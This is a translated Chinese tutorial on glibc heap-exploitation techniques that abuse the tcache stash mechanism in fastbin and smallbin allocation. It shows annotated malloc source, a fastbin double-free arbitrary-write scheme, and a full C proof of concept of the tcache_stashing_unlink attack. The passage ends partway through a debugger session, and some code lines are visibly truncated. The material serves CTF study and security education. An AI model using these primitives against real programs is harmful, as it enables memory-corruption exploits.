# glibc 2.29引入 stash 机制后引起的相关漏洞学习
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
以下示例的libc源码均为libc2.31.
## fastbin的stash机制
这里分析一下对于fastbin的stash机制
     if ((unsigned long)(nb) fd; //取出头chunk
          else
            REMOVE_FB(fb, pp, victim);
          if (__glibc_likely(victim != NULL)) 
          {
            size_t victim_idx = fastbin_index(chunksize(victim));
            if (__builtin_expect(victim_idx != idx, 0)) //对fastbin的size检查
              malloc_printerr("malloc(): memory corruption (fast)");
            check_remalloced_chunk(av, victim, nb);
     //if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中
            /* While we're here, if we see other chunks of the same size,
             stash them in the tcache.  */
            size_t tc_idx = csize2tidx(nb);
            if (tcache && tc_idx counts[tc_idx] fd;
                else
                {
                  REMOVE_FB(fb, pp, tc_victim);
                  if (__glibc_unlikely(tc_victim == NULL))
                    break;
                }
                tcache_put(tc_victim, tc_idx);//放入tcache中
              }
            }
    #endif
            void *p = chunk2mem(victim);
            alloc_perturb(p, bytes);
            return p;
          }
        }
      }
也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。
###  Tcache Stashing 遇上 fastbin double free
假设有个double free可以触发，其用到fastbin上：  
进行free 多次构成：
为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）
然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：
主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。
但是有了stash这个机制，其就变成了以下的情况：
由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk
7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 、7 、tag 。这就相当于劫持了tcache
chain，可以实现任意地址写。
###  相关例题
  * bytectf2020 gun （libc2.31）
  * 太湖杯 seven hero （libc2.29）
## smallbin的stash机制
对于smallbin的stash机制：
    if (in_smallbin_range (nb))
        {
          idx = smallbin_index (nb);
          bin = bin_at (av, idx); //smallbin 从chain尾开始取到的chunk的fd位位 bin值 （根据 FIFO，即为最先放入的 Chunk）
          if ((victim = last (bin)) != bin) //victim 即为刚刚取到的chunk
            {
              bck = victim->bk; //获取倒数第二个chunk  
          if (__glibc_unlikely (bck->fd != victim)) //验证双向链表是否正常
            malloc_printerr ("malloc(): smallbin double linked list corrupted");
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;
              //将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出
              if (av != &main_arena)
            set_non_main_arena (victim);
              check_malloced_chunk (av, victim, nb);
    #if USE_TCACHE
          /* While we're here, if we see other chunks of the same size,
             stash them in the tcache.  */
          size_t tc_idx = csize2tidx (nb); //获取对应size的tcache索引
          if (tcache && tc_idx counts[tc_idx] bk)  也就是 tc_victim = bin->bk
            {
              if (tc_victim != 0)
                {
                  bck = tc_victim->bk;
                  set_inuse_bit_at_offset (tc_victim, nb);
                  if (av != &main_arena)
                set_non_main_arena (tc_victim);
                  bin->bk = bck;
                  bck->fd = bin;
              //将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出
                  tcache_put (tc_victim, tc_idx);
                    }
            }
            }
    #endif
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
也就是在smallbin分配之后，如果smallbin链表中仍然存在堆块，并且对应的tcache list没有满chain的话，就会将small
bin链表中所有的堆块放入到相应的tcache中。
**当然要发生这种分配的方式，必须要越过tcache优先分配堆块，calloc的分配是不从tcache bin里取chunk的，即可满足。**
下面跟着示例代码和glibc相关源码调试来学习一下：
### `tcache_stashing_unlink`
####  示例代码
    #include 
    #include 
    #include 
    static uint64_t victim = 0;
    int main(int argc, char **argv){
        setbuf(stdout, 0);
        setbuf(stderr, 0);
        char *t1;
        char *s1, *s2, *pad;
        char *tmp;
        printf("You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n");
        printf("\n1. need to know heap address and the victim address that you need to attack\n");
        tmp = malloc(0x1);
        printf("victim's address: %p, victim's vaule: 0x%lx\n", &victim, victim);
        printf("heap address: %p\n", tmp-0x260);
        printf("\n2. choose a stable size and free six identical size chunks to tcache_entry list\n");
        printf("Here, I choose the size 0x60\n");
        for(int i=0; i %p --> %p --> %p --> %p --> %p\n", 
            t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);
        printf("\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");
        /* 将两个大小相同的块（如tcache_entry）释放到相应的smallbin中 */
        s1 = malloc(0x420);
        printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
        pad = malloc(0x20);
        printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
        free(s1);
        printf("Free chunk %p to unsortedbin\n", s1);
        malloc(0x3c0);
        printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
        malloc(0x100);
        printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);
        printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
        printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
        s2 = malloc(0x420);
        pad = malloc(0x80);
        free(s2);
        malloc(0x3c0);
        malloc(0x100);
        printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
        printf("smallbin[4] list is %p  %p\n", s2+0x3c0, s1+0x3c0);
        printf("\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
        printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
        *(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;
        printf("\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");
        calloc(1, 0x50);
        printf("Finally, the victim's value is changed to a big number\n");
        printf("Now, victim's value: 0x%lx\n", victim);
        return 0;
    }
####  编译命令
    gcc  -g ./tcache_stashing_unlink.c -o tcache_stashing_unlink
-g 编译是可以让gdb显示源码
####  调试过程
    for(int i=0; i 0x555555559440 --> 0x5555555593e0 --> 0x555555559380 --> 0x555555559320 --> 0x5555555592c0
先往tcache 中0x60的bin chain 上放入6个bin.。
接着将两个大小相同的块（如`tcache_entry`）释放到相应的smallbin中。
        s1 = malloc(0x420);
        printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
        pad = malloc(0x20);
        printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
        free(s1);
        printf("Free chunk %p to unsortedbin\n", s1);
    pwndbg> heapinfo